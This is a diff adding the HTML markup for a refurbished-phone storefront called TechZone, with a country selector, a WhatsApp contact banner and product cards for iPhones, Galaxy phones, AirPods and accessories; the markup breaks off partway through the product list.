@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechZone - Premium Technology</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preload" href="style.css" as="style">
+    <link rel="preload" href="script.js" as="script">
+    <link rel="preload" href="hero background.png" as="image">
+    <link rel="preconnect" href="https://ng.jumia.is">
+    <link rel="preconnect" href="https://images.unsplash.com">
+</head>
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="container">
+            <div class="top-bar-content">
+                <div class="country-section">
+                    <span class="available-text" data-translate="available_in">Available in:</span>
+                    <div class="country-dropdown-wrapper">
+                        <button id="country-dropdown-btn" class="country-switch">
+                            <span class="flag-icon" id="current-flag">🇭🇳</span>
+                            <span id="current-country">Honduras</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </button>
+                        <div id="country-dropdown" class="country-dropdown hidden">
+                            <button class="country-option" data-country="nicaragua">
+                                <span class="flag-icon">🇳🇮</span>
+                                <span>Nicaragua</span>
+                            </button>
+                            <button class="country-option" data-country="honduras">
+                                <span class="flag-icon">🇭🇳</span>
+                                <span>Honduras</span>
+                            </button>
+                            <button class="country-option" data-country="trinidad">
+                                <span class="flag-icon">🇹🇹</span>
+                                <span>Trinidad and Tobago</span>
+                            </button>
+                            <button class="country-option" data-country="elsalvador">
+                                <span class="flag-icon">🇸🇻</span>
+                                <span>El Salvador</span>
+                            </button>
+                            <button class="country-option" data-country="paraguay">
+                                <span class="flag-icon">🇵🇾</span>
+                                <span>Paraguay</span>
+                            </button>
+                            <button class="country-option" data-country="guatemala">
+                                <span class="flag-icon">🇬🇹</span>
+                                <span>Guatemala</span>
+                            </button>
+                            <button class="country-option" data-country="dominican">
+                                <span class="flag-icon">🇩🇴</span>
+                                <span>Dominican Republic</span>
+                            </button>
+                            <button class="country-option" data-country="usa">
+                                <span class="flag-icon">🇺🇸</span>
+                                <span>USA</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <a href="#">
+                        <img src="https://1000logos.net/wp-content/uploads/2023/11/Swappie-Logo.png" alt="TechZone" style="height: 40px; width: auto;">
+                    </a>
+                </div>
+
+                <nav class="nav-desktop">
+                    <a href="index.html" class="nav-link" data-translate="home">Home</a>
+                    <a href="#products" class="nav-link" data-translate="products">Products</a>
+                    <a href="about.html" class="nav-link" data-translate="about">About</a>
+                    <a href="contact.html" class="nav-link" data-translate="contact">Contact</a>
+                </nav>
+
+                <div class="header-actions">
+                    <div class="search-box">
+                        <input type="text" data-translate-placeholder="search_products" placeholder="Search products...">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <a href="#" class="user-link">
+                        <i class="fas fa-user"></i>
+                    </a>
+                    <a href="#" id="cart-button" class="cart-link">
+                        <i class="fas fa-shopping-cart"></i>
+                        <span id="cart-count" class="cart-count">0</span>
+                    </a>
+                    <button class="mobile-menu-btn" id="mobile-menu-btn">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Mobile Menu -->
+            <div class="mobile-menu hidden" id="mobile-menu">
+                <div class="mobile-menu-content">
+                    <a href="index.html" class="mobile-menu-link" data-translate="home">Home</a>
+                    <a href="#products" class="mobile-menu-link" data-translate="products">Products</a>
+                    <a href="about.html" class="mobile-menu-link" data-translate="about">About</a>
+                    <a href="contact.html" class="mobile-menu-link" data-translate="contact">Contact</a>
+                </div>
+                <div class="mobile-search">
+                    <input type="text" data-translate-placeholder="search_products" placeholder="Search products...">
+                    <i class="fas fa-search"></i>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1 class="hero-title" data-translate="hero_title">The Best Technology at the Best Price</h1>
+                <p class="hero-subtitle" data-translate="hero_subtitle">Discover our premium selection of refurbished devices with full warranty and specialized technical support. Quality technology at exceptional prices.</p>
+                <div class="hero-buttons">
+                    <a href="#products" class="btn btn-primary" data-translate="shop_now" style="justify-content: center; max-width: 200px; margin: 0 auto;">
+                        <i class="fas fa-shopping-bag"></i>
+                        Shop Now
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Benefits Section -->
+    <section class="benefits-section">
+        <div class="container">
+            <div class="benefits-grid">
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-shipping-fast"></i>
+                    </div>
+                    <div>
+                        <h3 data-translate="benefit_free_shipping">Free Shipping</h3>
+                        <p data-translate="benefit_free_shipping_desc">On all orders</p>
+                    </div>
+                </div>
+
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div>
+                        <h3 data-translate="benefit_warranty">1 Year Warranty</h3>
+                        <p data-translate="benefit_warranty_desc">On all products</p>
+                    </div>
+                </div>
+
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-undo-alt"></i>
+                    </div>
+                    <div>
+                        <h3 data-translate="benefit_return">30 Day Return</h3>
+                        <p data-translate="benefit_return_desc">Full refund guaranteed</p>
+                    </div>
+                </div>
+
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-gift"></i>
+                    </div>
+                    <div>
+                        <h3 data-translate="benefit_accessories">Premium Accessories Included</h3>
+                        <p data-translate="benefit_accessories_desc">Fast charging cable with power adapter, original packaging, and premium Gorilla Glass screen protector</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- WhatsApp Contact Section -->
+    <section class="whatsapp-contact-section">
+        <div class="container">
+            <div class="whatsapp-banner">
+                <div class="whatsapp-content">
+                    <div class="whatsapp-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="whatsapp-text">
+                        <h3 data-translate="whatsapp_title">Want to swap for a lower model or need more information?</h3>
+                        <p data-translate="whatsapp_subtitle">Chat with our experts on WhatsApp for personalized recommendations and instant support</p>
+                    </div>
+                    <a href="https://wa.me/18005558324?text=Hi%20TechZone!%20I%27m%20interested%20in%20your%20refurbished%20devices%20and%20would%20like%20more%20information." 
+                       class="whatsapp-btn" target="_blank" rel="noopener noreferrer">
+                        <i class="fab fa-whatsapp"></i>
+                        <span data-translate="whatsapp_button">Chat on WhatsApp</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Products Section -->
+    <section id="products" class="products-section">
+        <div class="container">
+            <div class="section-header">
+                    <h2 data-translate="featured_products">Productos Destacados</h2>
+                    <div class="filters-container" style="display: flex; flex-direction: column; gap: 1rem; width: 100%;">
+                        <!-- Line 1: All, iPhone, Samsung -->
+                        <div class="filter-line-1" style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
+                            <button class="filter-btn active" data-filter="all" data-translate="all">Todos</button>
+                            <button class="filter-btn" data-filter="iphone" data-translate="iphones">iPhone</button>
+                            <button class="filter-btn" data-filter="samsung" data-translate="samsung">Samsung</button>
+                        </div>
+
+                        <!-- Line 2: Audio, Accessories -->
+                        <div class="filter-line-2" style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
+                            <button class="filter-btn" data-filter="audio" data-translate="audio">Audio</button>
+                            <button class="filter-btn" data-filter="accessory" data-translate="accessories">Accesorios</button>
+                        </div>
+
+                        <!-- Line 3: Price sorting buttons -->
+                        <div class="filter-line-3" style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
+                            <button class="sort-btn" data-sort="price-low" style="padding: 0.4rem 0.8rem; border-radius: 25px; border: 2px solid var(--border-color); background: white; font-weight: 600; cursor: pointer; transition: var(--transition); font-size: 0.75rem; white-space: nowrap;">
+                                <i class="fas fa-sort-amount-up"></i> <span data-translate="price_low_to_high">Cheapest First</span>
+                            </button>
+                            <button class="sort-btn" data-sort="price-high" style="padding: 0.4rem 0.8rem; border-radius: 25px; border: 2px solid var(--border-color); background: white; font-weight: 600; cursor: pointer; transition: var(--transition); font-size: 0.75rem; white-space: nowrap;">
+                                <i class="fas fa-sort-amount-down"></i> <span data-translate="price_high_to_low">Most Expensive First</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+            <div class="products-grid">
+                <!-- iPhone 16 Pro Max -->
+                <div class="product-card" data-category="iphones" data-product-id="iphone16promax">
+                    <div class="product-badge" data-translate="new">New!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=iphone16promax'">
+                        <img id="iphone16-main-image" src="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/49/0510004/1.jpg?6300" alt="iPhone 16 Pro Max" loading="eager" decoding="async" fetchpriority="high">
+
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=iphone16promax&lang=en">iPhone 16 Pro Max</a>
+                        </h3>
+                        <p class="product-desc" data-translate="iphone16promax_desc">Natural Titanium, 256GB - Apple's ultimate expression of innovation (Refurbished). 95% battery health guaranteed. Includes 1 year full warranty and 30 days free return.</p>
+
+                        <div class="product-price">
+                            <span class="current-price">Starting from $769</span>
+                        </div>
+                        <div class="product-actions">
+                            <a href="product.html?id=iphone16promax" class="btn btn-primary choose-type-btn">
+                                <i class="fas fa-mobile-alt"></i>
+                                <span data-translate="choose_type">Choose Type</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- iPhone 15 Pro Max -->
+                <div class="product-card" data-category="iphones" data-product-id="iphone15promax">
+                    <div class="product-badge" data-translate="certified">Certified!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=iphone15promax'">
+                        <img id="iphone15-main-image" src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/B/B/163129_1713554391.jpg" alt="iPhone 15 Pro Max" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=iphone15promax">iPhone 15 Pro Max</a>
+                        </h3>
+                        <p class="product-desc" data-translate="iphone15promax_desc">Titanio Natural, 512GB - Potencia extraordinaria (Reacondicionado). 95% salud de batería garantizada</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(47)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $649</span>
+                        </div>
+                        <a href="product.html?id=iphone15promax" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- iPhone 14 Pro Max -->
+                <div class="product-card" data-category="iphones" data-product-id="iphone14promax">
+                    <div class="product-badge" data-translate="hot">Hot!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=iphone14promax'">
+                        <img id="iphone14-main-image" src="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/17/7645104/2.jpg?9725" alt="iPhone 14 Pro Max" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=iphone14promax">iPhone 14 Pro Max</a>
+                        </h3>
+                        <p class="product-desc" data-translate="iphone14promax_desc">Morado Profundo, 128GB - Dynamic Island revolucionario (Reacondicionado). Mínimo 90% salud de batería garantizada</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(156)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $429</span>
+                        </div>
+                        <a href="product.html?id=iphone14promax" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- iPhone 13 Pro Max -->
+                <div class="product-card" data-category="iphones" data-product-id="iphone13promax">
+                    <div class="product-badge" data-translate="bestseller">Best Seller!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=iphone13promax'">
+                        <img id="iphone13-main-image" src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/R/B/163129_1685917309.jpg" alt="iPhone 13 Pro Max" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=iphone13promax">iPhone 13 Pro Max</a>
+                        </h3>
+                        <p class="product-desc" data-translate="iphone13promax_desc">Titanio, 256GB - Pro en todos los sentidos (Reacondicionado). Mínimo 90% salud de batería garantizada</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(203)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $359</span>
+                        </div>
+                        <a href="product.html?id=iphone13promax" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- iPhone 12 Pro Max -->
+                <div class="product-card" data-category="iphones" data-product-id="iphone12promax">
+                    <div class="product-badge" data-translate="deal">Deal!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=iphone12promax'">
+                        <img id="iphone12-main-image" src="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/42/1204812/1.jpg?0962" alt="iPhone 12 Pro Max" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=iphone12promax">iPhone 12 Pro Max</a>
+                        </h3>
+                        <p class="product-desc" data-translate="iphone12promax_desc">Titanio, 128GB - El primer iPhone 5G (Reacondicionado). Mínimo 90% salud de batería garantizada</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(89)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $219</span>
+                        </div>
+                        <a href="product.html?id=iphone12promax" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- iPhone 11 Pro Max -->
+                <div class="product-card" data-category="iphones" data-product-id="iphone11promax">
+                    <div class="product-badge" data-translate="value">Great Value!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=iphone11promax'">
+                        <img id="iphone11-main-image" src="https://ng.jumia.is/unsafe/fit-in/500x500/filters:fill(white)/product/82/2566612/1.jpg?1771" alt="iPhone 11 Pro Max" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=iphone11promax">iPhone 11 Pro Max</a>
+                        </h3>
+                        <p class="product-desc" data-translate="iphone11promax_desc">Dorado, 256GB - Cámara triple revolucionaria (Reacondicionado). Mínimo 90% salud de batería garantizada</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(142)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $149</span>
+                        </div>
+                        <a href="product.html?id=iphone11promax" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Samsung Galaxy S25 Ultra -->
+                <div class="product-card" data-category="samsung" data-product-id="galaxys25ultra">
+                    <div class="product-badge" data-translate="new">New!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=galaxys25ultra'">
+                        <img id="galaxys25-main-image" src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/C/B/67343_1732713967.jpg" alt="Samsung Galaxy S25 Ultra" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=galaxys25ultra">Samsung Galaxy S25 Ultra</a>
+                        </h3>
+                        <p class="product-desc" data-translate="galaxys25ultra_desc">Titanium Black, 512GB - Revolutionary AI with S Pen (Refurbished). 95% battery health guaranteed</p>
+
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(12)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $719</span>
+                        </div>
+                        <a href="product.html?id=galaxys25ultra" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+                <!-- Samsung Galaxy S24 Ultra -->
+                <div class="product-card" data-category="samsung" data-product-id="galaxys24ultra">
+                    <div class="product-badge" data-translate="premium">Premium!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=galaxys24ultra'">
+                        <img id="galaxys24-main-image" src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/P/D/67343_1707126048.jpg" alt="Samsung Galaxy S24 Ultra" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=galaxys24ultra">Samsung Galaxy S24 Ultra</a>
+                        </h3>
+                        <p class="product-desc" data-translate="galaxys24ultra_desc">Titanium Violet, 256GB - Galaxy AI at your fingertips (Refurbished). 95% battery health guaranteed</p>
+
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(34)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $529</span>
+                        </div>
+                        <a href="product.html?id=galaxys24ultra" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+                <!-- Samsung Galaxy S23 Ultra -->
+                <div class="product-card" data-category="samsung" data-product-id="galaxys23ultra">
+                    <div class="product-badge" data-translate="top_rated">Top Rated!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=galaxys23ultra'">
+                        <img id="galaxys23-main-image" src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/Z/T/141488_1684232842.jpg" alt="Samsung Galaxy S23 Ultra" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=galaxys23ultra">Samsung Galaxy S23 Ultra</a>
+                        </h3>
+                        <p class="product-desc" data-translate="galaxys23ultra_desc">Red, 512GB - Capture the night like never before</p>
+
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(278)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $329</span>
+                        </div>
+                        <a href="product.html?id=galaxys23ultra" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+                <!-- Samsung Galaxy S22 Ultra -->
+                <div class="product-card" data-category="samsung" data-product-id="galaxys22ultra">
+                    <div class="product-badge" data-translate="popular">Popular!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=galaxys22ultra'">
+                        <img id="galaxys22-main-image" src="https://ng.jumia.is/unsafe/fit-in/500x500/filters:fill(white)/product/91/5971252/1.jpg?7934" alt="Samsung Galaxy S22 Ultra" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=galaxys22ultra">Samsung Galaxy S22 Ultra</a>
+                        </h3>
+                        <p class="product-desc" data-translate="galaxys22ultra_desc">Black, 256GB - The Note reimagined with built-in S Pen</p>
+
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(421)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $229</span>
+                        </div>
+                        <a href="product.html?id=galaxys22ultra" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- AirPods 4 with ANC -->
+                <div class="product-card" data-category="audio" data-product-id="airpods4">
+                    <div class="product-badge" data-translate="new">New!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=airpods4'">
+                        <img src="https://ng.jumia.is/unsafe/fit-in/500x500/filters:fill(white)/product/31/2933714/1.jpg?9024" alt="AirPods 4 with ANC" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=airpods4">AirPods 4 with ANC</a>
+                        </h3>
+                        <p class="product-desc">Cancelación de ruido activa con estuche de carga USB-C</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(87)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $199</span>
+                        </div>
+                        <a href="product.html?id=airpods4" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-headphones"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- AirPods 3 -->
+                <div class="product-card" data-category="audio" data-product-id="airpod3">
+                    <div class="product-badge" data-translate="popular">Popular!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=airpod3'">
+                        <img src="https://ng.jumia.is/unsafe/fit-in/500x500/filters:fill(white)/product/11/4529033/1.jpg?8756" alt="AirPods 3" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=airpod3">AirPods 3</a>
+                        </h3>
+                        <p class="product-desc">Audio Espacial personalizado con diseño contorneado</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(123)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $99</span>
+                        </div>
+                        <a href="product.html?id=airpod3" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-headphones"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- JBL GO 3 -->
+                <div class="product-card" data-category="audio" data-product-id="jblgoportable">
+                    <div class="product-badge" data-translate="budget">Budget!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=jblgoportable'">
+                        <img src="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/78/9143073/1.jpg?3903" alt="JBL GO 3" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=jblgoportable">JBL GO 3</a>
+                        </h3>
+                        <p class="product-desc">Altavoz Bluetooth portátil - Azul</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(67)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">Starting from $19.99</span>
+                        </div>
+                        <a href="product.html?id=jblgoportable" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-volume-up"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- AirPods Pro 2 -->
+                <div class="product-card" data-category="audio" data-product-id="airpodspro2">
+                    <div class="product-badge" data-translate="premium">Premium!</div>
+                    <div class="product-image" onclick="window.location.href='product.html?id=airpodspro2'">
+                        <img src="https://images.unsplash.com/photo-1600294037681-c80b4cb5b434?w=600&h=400&fit=crop&crop=center" alt="AirPods Pro 2" loading="lazy" decoding="async">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                            <a href="product.html?id=airpodspro2">AirPods Pro (2da Gen)</a>
+                        </h3>
+                        <p class="product-desc" data-translate="airpods_desc">Cancelación de ruido activa de siguiente nivel</p>
+                        <div class="product-rating">
+                            <div class="stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <span class="rating-count">(98)</span>
+                        </div>
+                        <div class="product-price">
+                            <span class="current-price">$179.00</span>
+                            <span class="original-price">$249.00</span>
+                            <span class="discount">-28%</span>
+                        </div>
+                        <a href="product.html?id=airpodspro2" class="btn btn-primary choose-type-btn">
+                            <i class="fas fa-headphones"></i>
+                            <span data-translate="choose_type">Choose Type</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Screen Protector -->
+                <div class="product-card" data-category="accessories" data-product-id="screenprotector">
+                    <div class="product-image">
+                        <img src="https://m.media-amazon.com/images/I/61NGYQsztvL._UF1000,1000_QL80_FMwebp_.jpg" alt="Gorilla Glass Screen Protector">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                             <a href="product.html?id=screenprotector&lang=en">Premium Gorilla Glass Screen Protection</a>
+                        </h3>
+                        <p class="product-desc" data-translate="protector_desc">Professional-grade 9H hardness tempered glass screen protector with oleophobic coating technology. Crystal-clear transparency with advanced bubble-free installation system for seamless device protection.</p>
+                        <div class="product-price">
+                            <span class="current-price">$11.99</span>
+                            <span class="original-price">$19.99</span>
+                            <span class="discount">-40%</span>
+                        </div>
+                        <div class="product-features">
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>9H Hardness</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Bubble-Free</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Crystal Clear</span>
+                            </div>
+                        </div>
+                        <div class="product-actions">
+                            <a href="product.html?id=screenprotector&lang=en" class="details-btn">
+                                <i class="fas fa-info-circle"></i>
+                                <span>Details</span>
+                            </a>
+                            <button class="add-to-cart-btn" data-product='{"id": "screenprotector", "name": "Gorilla Glass Screen Protector", "price": 11.99, "image": "https://m.media-amazon.com/images/I/61NGYQsztvL._UF1000,1000_QL80_FMwebp_.jpg"}'>
+                            <i class="fas fa-cart-plus"></i>
+                            <span data-translate="add_to_cart">Add to Cart</span>
+                        </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Power Bank -->
+                <div class="product-card" data-category="accessories" data-product-id="powerbank">
+                    <div class="product-image">
+                        <img src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/J/D/190950_1664522191.jpg" alt="Power Bank">
+                    </div>
+                    <div class="product-info">
+                        <h3 class="product-name">
+                             <a href="product.html?id=powerbank&lang=en">Portable Power Bank 5000mAh</a>
+                        </h3>
+                        <p class="product-desc" data-translate="powerbank_desc">Compact 5000mAh power bank. Fast charging for phones and small devices. LED battery indicator and multiple protection systems.</p>
+                        <div class="product-price">
+                            <span class="current-price">$16</span>
+                            <span class="original-price">$25</span>
+                            <span class="discount">-36%</span>
+                        </div>
+                        <div class="product-features">
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>5000mAh Capacity</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>Fast Charging</span>
+                            </div>
+                            <div class="feature">
+                                <i class="fas fa-check"></i>
+                                <span>LED Indicator</span>
+                            </div>
+                        </div>
+                        <div class="product-actions">
+                            <a href="product.html?id=powerbank&lang=en" class="details-btn">
+                                <i class="fas fa-info-circle"></i>
+                                <span>Details</span>
+                            </a>
